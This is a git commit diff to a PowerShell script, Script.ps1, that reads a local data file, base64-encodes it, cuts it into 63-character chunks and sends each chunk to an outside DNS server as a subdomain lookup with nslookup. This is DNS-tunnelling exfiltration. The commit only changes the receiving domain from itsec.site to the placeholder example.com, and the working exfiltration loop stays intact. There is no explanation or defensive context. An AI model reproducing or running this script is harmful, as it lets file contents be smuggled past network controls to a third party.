946ca78cf3adbe4b7fead71f5e241200ce50d654
priyank49 <51224892+priyank49@users.noreply.github.com>
2025-01-07 13:38:16 +0530

    Update Script.ps1

--- Script.ps1
+++ Script.ps1
@@ -2,6 +2,6 @@ $filepath = "DataFile.txt"
 $data = Get-Content -Path $filepath -Raw
 $encode=[System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data)) -split '(.{63})' | Where-Object {$_ -ne ''}
 foreach ($chunk in $encode){
-$query="$chunk.itsec.site"
-nslookup $query itsec.site
+$query="$chunk.example.com"
+nslookup $query example.com
 }
